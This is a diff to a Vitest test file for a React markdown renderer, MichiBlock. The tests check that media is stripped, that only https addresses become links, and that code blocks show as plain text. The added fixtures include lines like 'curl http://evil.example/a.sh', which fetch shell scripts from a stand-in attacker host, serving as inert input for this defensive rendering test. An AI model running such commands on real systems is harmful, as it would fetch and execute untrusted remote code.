@@ -1,5 +1,4 @@
-import React from 'react';
-import { describe, expect, it, vi } from 'vitest';
+import { describe, expect, it } from 'vitest';
 import { render } from '@testing-library/react';
 import { MichiBlock } from '../MichiBlock';
 
@@ -8,7 +7,11 @@ const MEDIA = 'img, picture, source, track, video, audio, iframe, frame, embed, 
 const PAGE_MARKDOWN = [
   '`` ![x](http://t.example/a.png) `',
   '![a\nb](http://t.example/b.png)',
+  // Not a fence: a backtick fence's info string cannot hold a backtick.
   '```x`y\n![c](http://t.example/c.png)',
+  '```\ncurl http://evil.example/a.sh\n```',
+  '```bash\ncurl http://evil.example/b.sh\n```',
+  '    curl http://evil.example/c.sh',
   '[l](http://plain.example) <http://auto.example> http://bare.example',
   '<a href="http://raw.example">r</a> <img src="https://t.example/raw.png" alt="raw alt">',
   '[r][d] ![p][pic]\n\n[d]: http://ref.example\n[pic]: https://t.example/ref.png',
@@ -26,6 +29,15 @@ describe('Michi markdown blocks', () => {
     expect(hrefs.every((href) => href.startsWith('#') || /^https:\/\/[^/]/.test(href))).toBe(true);
     expect(hrefs).toContain('https://ok.example/p');
     expect(container.textContent).toContain('raw alt');
+    expect(container.textContent).toContain('curl http://evil.example/c.sh');
+  });
+
+  it('link only https addresses in code blocks', () => {
+    const { container } = render(
+      <MichiBlock block={{ type: 'code', code: 'curl http://x.example/a https://ok.example/b' }} ctx={{ depth: 0 }} />,
+    );
+    expect(container.textContent).toContain('curl http://x.example/a');
+    expect(Array.from(container.querySelectorAll('a')).map((a) => a.getAttribute('href'))).toEqual(['https://ok.example/b']);
   });
 });
 
